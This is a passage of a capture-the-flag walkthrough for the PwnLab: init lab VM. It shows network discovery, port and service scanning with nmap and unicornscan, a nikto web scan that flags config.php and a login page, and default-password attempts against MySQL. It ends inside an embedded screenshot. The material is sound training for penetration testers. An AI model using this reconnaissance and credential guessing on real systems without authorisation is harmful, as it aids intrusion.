[PwnLab: init](https://www.vulnhub.com/entry/pwnlab-init,158/) is a great
boot2root VM for beginner pentester. Let's get started, shall we?

## 0\. Get VM's IP

  

    
    
     1  
     2  
     3  
     4  
     5  
     6  
     7  
     8  
     9  
    10

|

    
    
    root@kali:~# netdiscover -r 192.168.1.0/24  
      
     Currently scanning: Finished!   |   Screen View: Unique Hosts                  
      
     14 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 840               
     _____________________________________________________________________________  
       IP            At MAC Address     Count     Len  MAC Vendor / Hostname       
     -----------------------------------------------------------------------------  
     192.168.1.65    08:00:27:ff:06:c9      1      60  Cadmus Computer Systems      
     ...  
      
  
---|---  
  
  
Victim's IP: 192.168.1.65.

## 1\. Enumeration

Let's do some enumeration! Starting by running onetwopunch script to utilize
both unicornscan's fast scanning and nmap's version detection. For this b2r I
only needed to enumerate services.

  

**1.1 TCP/UDP services enumeration**

####  
    
    
     1  
     2  
     3  
     4  
     5  
     6  
     7  
     8  
     9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
    18  
    19  
    20  
    21  
    22  
    23  
    24  
    25  
    26  
    27  
    28  
    29  
    30  
    31  
    32  
    33  
    34  
    35  
    36  
    37  
    38  
    39  
    40  
    41  
    42  
    43  
    44  
    45  
    46  
    47  
    48  
    49  
    50  
    51  
    52  
    53  
    54  
    55

|

    
    
    root@kali:~/Desktop# ./onetwopunch.sh -t targets -p all -n "-sV -O --version-intensity=9"  
                                 _                                          _       _  
      ___  _ __   ___           | |___      _____    _ __  _   _ _ __   ___| |__   / \  
     / _ \| '_ \ / _ \          | __\ \ /\ / / _ \  | '_ \| | | | '_ \ / __| '_ \ /  /  
    | (_) | | | |  __/ ?(ò_ó?)? | |_ \ V  V / (_) | | |_) | |_| | | | | (__| | | /\_/  
     \___/|_| |_|\___|           \__| \_/\_/ \___/  | .__/ \__,_|_| |_|\___|_| |_\/    
                                                    |_|                                
                                                                       by superkojiman  
      
    [+] Protocol : all  
    [+] Interface: eth0  
    [+] Nmap opts: -A -sV --version-intensity=9  
    [+] Targets  : targets  
    [+] Scanning 192.168.1.65 for all ports...  
    [+] Obtaining all open TCP ports using unicornscan...  
    [+] unicornscan -i eth0 -mT 192.168.1.65:a -l /root/.onetwopunch/udir/192.168.1.65-tcp.txt  
    Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 2948 and we have 1550  
    [*] TCP ports for nmap to scan: 80,111,3306,49623,  
    [+] nmap -e eth0 -sV -O --version-intensity=9 -oX /root/.onetwopunch/ndir/192.168.1.65-tcp.xml -oG /root/.onetwopunch/ndir/192.168.1.65-tcp.grep -p 80,111,3306,49623, 192.168.1.65  
      
    Starting Nmap 7.31 ( https://nmap.org ) at 2016-11-09 22:56 EST  
    Nmap scan report for 192.168.1.65  
    Host is up (0.00020s latency).  
    PORT      STATE SERVICE VERSION  
    **80/tcp    open  http    Apache httpd 2.4.10 ((Debian))  
    111/tcp   open  rpcbind 2-4 (RPC #100000)  
    3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1  
    49623/tcp open  status  1 (RPC #100024)**  
    MAC Address: 08:00:27:FF:06:C9 (Oracle VirtualBox virtual NIC)  
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
    Device type: general purpose  
    Running: Linux 3.X|4.X  
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4  
    OS details: Linux 3.2 - 4.4  
    Nmap done: 1 IP address (1 host up) scanned in 24.98 seconds  
      
    [+] Obtaining all open UDP ports using unicornscan...  
    [+] unicornscan -i eth0 -mU 192.168.1.65:a -l /root/.onetwopunch/udir/192.168.1.65-udp.txt  
    [*] UDP ports for nmap to scan: 111,  
    [+] nmap -e eth0 -sV -O --version-intensity=9 -sU -oX /root/.onetwopunch/ndir/192.168.1.65-udp.xml -oG /root/.onetwopunch/ndir/192.168.1.65-udp.grep -p 111, 192.168.1.65  
    Starting Nmap 7.31 ( https://nmap.org ) at 2016-11-09 23:01 EST  
    Nmap scan report for 192.168.1.65  
    Host is up (0.00020s latency).  
    PORT    STATE SERVICE VERSION  
    **111/udp open  rpcbind 2-4 (RPC #100000)**  
    MAC Address: 08:00:27:FF:06:C9 (Oracle VirtualBox virtual NIC)  
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
    Device type: general purpose  
    Running: Linux 2.4.X|2.6.X  
    OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6  
    OS details: Linux 2.4.20, Linux 2.6.14 - 2.6.34, Linux 2.6.17 (Mandriva), Linux 2.6.23, Linux 2.6.24  
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
    Nmap done: 1 IP address (1 host up) scanned in 14.39 seconds  
    [+] Scans completed  
    [+] Results saved to /root/.onetwopunch  
      
  
---|---  
  
  

What catches your eye is that there's a web server running as well as mysql.
While you navigate to the webserver in your browser, don't waste that CPU
power and run nikto and/or dirbuster too!

**  
**

**1.2 Scanning the web server **

  

When there's a web server running, you'll want to do the following, of course
depending on what you need/looking for:

  * **Investigate HTTP requests/responses**  
**Tools:** Burp Suite, Fiddler, Tamper Data/Cookies Manager+ (FF addons)
  * **Scan for vulnerabilities (outdated version, LFI/RFI, SQLi, ...)**  
**Tools: **Nikto, sqlmap, nmap scripts
  * **Search for hidden/misconfigured directories or files**  
**Tools: **Dirbuster, GoBuster, Nikto

More can be found [here](http://sectools.org/tag/web-scanners/). Way more can
be found [here](http://www.google.com/).  
  
Usually I start by running Nikto:  
  

    
    
     1  
     2  
     3  
     4  
     5  
     6  
     7  
     8  
     9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
    18  
    19  
    20  
    21  
    22  
    23  
    24  
    25  
    26  
    27

|

    
    
    root@kali:~/Desktop# nikto -host 192.168.1.65  
    - Nikto v2.1.6  
    ---------------------------------------------------------------------------  
    + Target IP:          192.168.1.65  
    + Target Hostname:    192.168.1.65  
    + Target Port:        80  
    + Start Time:         2016-11-09 22:54:56 (GMT-5)  
    ---------------------------------------------------------------------------  
    + Server: Apache/2.4.10 (Debian)  
    + The anti-clickjacking X-Frame-Options header is not present.  
    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS  
    + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type  
    + No CGI Directories found (use '-C all' to force check all possible dirs)  
    + OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.0.1/images/".  
    + Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.  
    + Web Server returns a valid response with junk HTTP methods, this may cause false positives.  
    + Cookie PHPSESSID created without the httponly flag  
    **+ /config.php: PHP Config file may contain database IDs and passwords.**  
    + OSVDB-3268: /images/: Directory indexing found.  
    + OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.  
    + Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80  
    + OSVDB-3233: /icons/README: Apache default file found.  
    **+ /login.php: Admin login page/section found.**  
    + 7535 requests: 0 error(s) and 13 item(s) reported on remote host  
    + End Time:           2016-11-09 22:55:10 (GMT-5) (14 seconds)  
    ---------------------------------------------------------------------------  
    + 1 host(s) tested  
      
  
---|---  
  
  

  * config.php is of extreme interest to us, as it might contain credentials to mysql or to the login form, yet investigating it shows an empty page, probably the content is only between PHP tags.
  * There's a login form, same as the one shown in http://192.168.1.65/?page=login. **Possibly vulnerable to LFI**.

### 2\. Bruteforcing MySQL default credentials

Bruteforcing a service for default credentials could be very rewarding, I
tried bruteforcing MySQL manually as well as using hydra but in vain.

  

    
    
     1  
     2  
     3  
     4  
     5  
     6  
     7  
    

|

    
    
    root@kali:~/Desktop# mysql -h 192.168.1.65 -u root -p  
    Enter password: (empty)  
    ERROR 1045 (28000): Access denied for user 'root'@'192.168.1.71' (using password: NO)  
    root@kali:~/Desktop# mysql -h 192.168.1.65 -u root -p  
    Enter password: (root)  
    ERROR 1045 (28000): Access denied for user 'root'@'192.168.1.71' (using password: YES)  
    root@kali:~/Desktop#   
      
  
---|---  
  
###  

### 3\. Checking out the web service

**3.1 Login page**

**![](data:image/png;base64,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